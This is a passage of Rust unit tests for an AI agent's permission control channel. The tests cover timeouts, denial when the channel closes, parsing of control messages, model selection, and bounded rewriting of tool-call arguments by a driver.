            state.ask_escalation("rm x", "why").await,
            Reply::Deny(reason) if reason.contains("within 7s")
        ));
        assert!(matches!(
            state.ask_network("a.test:80").await,
            Reply::Deny(reason) if reason.contains("within 7s")
        ));
    }

    #[tokio::test(start_paused = true)]
    async fn a_zero_timeout_waits_for_the_driver() {
        let state = std::sync::Arc::new(state(Duration::ZERO));
        let waiting = std::sync::Arc::clone(&state);
        let task = tokio::spawn(async move { waiting.ask("write", "x").await });
        tokio::time::sleep(Duration::from_secs(86_400)).await;
        assert!(!task.is_finished(), "0 means no deadline");
        let id = pending_id(&state).await;
        state.handle(classify_line(&response(&id, "allow")).unwrap());
        assert_eq!(task.await.unwrap(), Reply::Allow);
    }

    #[tokio::test(start_paused = true)]
    async fn closing_the_channel_denies_pending_and_later_asks_even_with_no_timeout() {
        let state = std::sync::Arc::new(state(Duration::ZERO));
        let waiting = std::sync::Arc::clone(&state);
        let task = tokio::spawn(async move { waiting.ask("write", "x").await });
        let _ = pending_id(&state).await;
        state.close();
        assert_eq!(
            task.await.unwrap(),
            Reply::Deny("the control channel closed".into())
        );
        assert_eq!(
            state.ask("bash", "touch x").await,
            Reply::Deny("the control channel closed".into())
        );
        assert!(state.pending_ids().is_empty());
    }

    fn control_line(text: &str) -> ControlLine {
        classify_line(text).expect("a control line")
    }

    #[test]
    fn initialize_set_model_and_updated_input_are_classified() {
        assert_eq!(
            control_line(
                r#"{"type":"control_request","request_id":"i","request":{"subtype":"initialize","hooks":{},"agents":[1]}}"#
            ),
            ControlLine::Initialize {
                request_id: Some("i".into())
            }
        );
        assert_eq!(
            control_line(
                r#"{"type":"control_request","request_id":"m","request":{"subtype":"set_model","model":"fast"}}"#
            ),
            ControlLine::SetModel {
                request_id: Some("m".into()),
                model: "fast".into()
            }
        );
        assert!(matches!(
            control_line(r#"{"type":"control_request","request":{"subtype":"set_model"}}"#),
            ControlLine::Invalid { .. }
        ));
        let allow = r#"{"type":"control_response","response":{"subtype":"success","request_id":"perm_1","response":{"behavior":"allow","updatedInput":{"command":"ls"}}}}"#;
        assert_eq!(
            control_line(allow),
            ControlLine::Response {
                request_id: "perm_1".into(),
                reply: Reply::AllowWith(r#"{"command":"ls"}"#.into())
            }
        );
        // A null updatedInput is a plain allow.
        let plain = r#"{"type":"control_response","response":{"subtype":"success","request_id":"perm_1","response":{"behavior":"allow","updatedInput":null}}}"#;
        assert!(matches!(
            control_line(plain),
            ControlLine::Response {
                reply: Reply::Allow,
                ..
            }
        ));
    }

    #[test]
    fn initialize_reports_the_protocol_session_and_models_and_set_model_validates() {
        let state = state(Duration::from_secs(1));
        state.set_info("sess-1", vec!["fast".into(), "deep".into()]);
        let ack = state
            .handle(ControlLine::Initialize {
                request_id: Some("i".into()),
            })
            .unwrap();
        let payload = &ack["response"]["response"];
        assert_eq!(ack["response"]["subtype"], "success");
        assert_eq!(payload["protocol"], PROTOCOL_VERSION);
        assert_eq!(payload["session_id"], "sess-1");
        assert_eq!(payload["models"], serde_json::json!(["deep", "fast"]));
        assert!(
            payload["supported_requests"]
                .as_array()
                .unwrap()
                .iter()
                .any(|name| name == "set_model")
        );
        let bad = state
            .handle(ControlLine::SetModel {
                request_id: Some("m".into()),
                model: "gpt-nope".into(),
            })
            .unwrap();
        assert_eq!(bad["response"]["subtype"], "error");
        assert!(state.take_model().is_none());
        let good = state
            .handle(ControlLine::SetModel {
                request_id: Some("m".into()),
                model: "fast".into(),
            })
            .unwrap();
        assert_eq!(good["response"]["subtype"], "success");
        assert_eq!(state.take_model().as_deref(), Some("fast"));
        assert!(state.take_model().is_none(), "taken once");
    }

    #[tokio::test]
    async fn updated_input_that_differs_is_a_rewrite_and_an_echo_is_a_plain_allow() {
        let state = std::sync::Arc::new(state(Duration::from_secs(5)));
        let call = r#"{"command":"ls"}"#.to_owned();
        for (reply, expected) in [
            (
                r#"{"command":"ls -la"}"#,
                Reply::AllowWith(r#"{"command":"ls -la"}"#.into()),
            ),
            (r#"{"command":"ls"}"#, Reply::Allow),
            (r#""the offered text""#, Reply::Allow),
            // mini-agent-6wtc2: a non-object updatedInput denies the call.
            (r#"[1]"#, Reply::Deny(UPDATED_INPUT_NOT_AN_OBJECT.into())),
            (r#"7"#, Reply::Deny(UPDATED_INPUT_NOT_AN_OBJECT.into())),
        ] {
            let waiting = std::sync::Arc::clone(&state);
            let args = call.clone();
            let task = tokio::spawn(CALL_ARGS.scope(args, async move {
                waiting.ask_tool("shell", "the offered text").await
            }));
            let id = pending_id(&state).await;
            let line = format!(
                r#"{{"type":"control_response","response":{{"subtype":"success","request_id":"{id}","response":{{"behavior":"allow","updatedInput":{reply}}}}}}}"#
            );
            state.handle(classify_line(&line).unwrap());
            assert_eq!(task.await.unwrap(), expected, "{reply}");
        }
        // `ask` (escalation, network) never takes edited arguments.
        let waiting = std::sync::Arc::clone(&state);
        let task = tokio::spawn(async move { waiting.ask("sandbox_escalation", "x").await });
        let id = pending_id(&state).await;
        let line = format!(
            r#"{{"type":"control_response","response":{{"subtype":"success","request_id":"{id}","response":{{"behavior":"allow","updatedInput":{{"a":1}}}}}}}}"#
        );
        state.handle(classify_line(&line).unwrap());
        assert_eq!(task.await.unwrap(), Reply::Allow);
    }

    #[test]
    fn the_ask_carries_the_call_arguments_as_tool_input() {
        let event = CALL_ARGS.sync_scope(r#"{"path":"a","content":"b"}"#.into(), || {
            ask_event("perm_1", "write", "a").unwrap()
        });
        assert_eq!(event["request"]["tool_input"]["path"], "a");
        let none = ask_event("perm_2", "write", "a").unwrap();
        assert!(none["request"].get("tool_input").is_none());
    }

    #[tokio::test]
    async fn a_rewrite_request_reruns_the_call_with_the_edited_arguments_a_bounded_number_of_times()
    {
        assert_eq!(
            rewrite_request(&format!("ToolCallError: {}", rewrite_error(r#"{"a":1}"#))),
            Some(r#"{"a":1}"#.into())
        );
        assert_eq!(rewrite_request("Permission denied: x"), None);
        assert_eq!(rewrite_request(&rewrite_error("[1]")), None);
        let runs = std::sync::Mutex::new(Vec::<String>::new());
        let result = run_updates(
            true,
            r#"{"v":0}"#.to_owned(),
            |out: &String| Some(out.clone()),
            |args| {
                runs.lock().unwrap().push(args.clone());
                async move {
                    if args == r#"{"v":0}"# {
                        rewrite_error(r#"{"v":1}"#)
                    } else {
                        format!("ran {args}")
                    }
                }
            },
        )
        .await;
        assert_eq!(result, r#"ran {"v":1}"#);
        assert_eq!(runs.lock().unwrap().len(), 2);
        // A driver that keeps editing is cut off after MAX_INPUT_REWRITES.
        let runs = std::sync::atomic::AtomicUsize::new(0);
        let result = run_updates(
            true,
            "{}".to_owned(),
            |out: &String| Some(out.clone()),
            |_| {
                runs.fetch_add(1, Ordering::SeqCst);
                async { rewrite_error(r#"{"again":true}"#) }
            },
        )
        .await;
        assert!(rewrite_request(&result).is_some());
        assert_eq!(runs.load(Ordering::SeqCst), MAX_INPUT_REWRITES + 1);
        // With the channel off, nothing is rerun.
        let off = run_updates(
            false,
            "{}".to_owned(),
            |out: &String| Some(out.clone()),
            |_| async { rewrite_error(r#"{"x":1}"#) },
        )
        .await;
        assert!(rewrite_request(&off).is_some());
    }
}
